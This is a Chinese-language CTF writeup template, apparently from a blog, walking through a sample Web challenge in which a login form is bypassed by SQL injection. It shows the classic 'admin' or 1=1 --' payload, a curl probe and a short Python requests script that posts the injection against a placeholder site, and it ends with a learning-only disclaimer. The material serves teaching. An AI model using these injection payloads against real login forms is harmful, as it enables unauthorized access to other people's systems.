# 示例：一道 Web 题（SQL 注入）

::: tip 说明
这是一篇 **Writeup 模板**，演示博客支持的排版能力。写你自己的题目时，照着这个结构替换内容即可。
:::

## 题目信息

| 项目 | 内容 |
|------|------|
| 比赛 | 示例赛 |
| 分类 | Web |
| 难度 | 简单 |
| 考点 | SQL 注入 |

## 题目描述

> 网站有一个登录框，尝试绕过登录获取 flag。

打开题目页面，发现一个用户名密码登录框。先尝试最经典的单引号注入，观察报错：

```sql
admin' or 1=1 --
```

## 解题思路

### 1. 判断注入点

在用户名处输入单引号，页面返回 SQL 报错，说明存在注入点：

```bash
curl -s http://example.com/login -d "user=admin'&pass=1"
```

返回结果包含数据库报错信息，确认是 **字符型 SQL 注入**。

### 2. 构造 payload

直接构造万能密码绕过登录：

```python
import requests

url = "http://example.com/login"
data = {
    "user": "admin' or '1'='1' --",
    "pass": "whatever",
}
r = requests.post(url, data=data)
print(r.text)
```

### 3. 拿到 flag

登录成功后，页面回显了 flag：

```text
flag{this_is_an_example_flag}
```

## 复盘总结

::: warning 关键点
字符型注入闭合单引号时，注意末尾要加 `--` 注释掉剩余部分。
:::

- 遇到登录框，优先测单引号判断注入类型
- 报错信息不要放过，能透露数据库类型

---

*本文仅供学习交流，请勿用于未授权测试。*
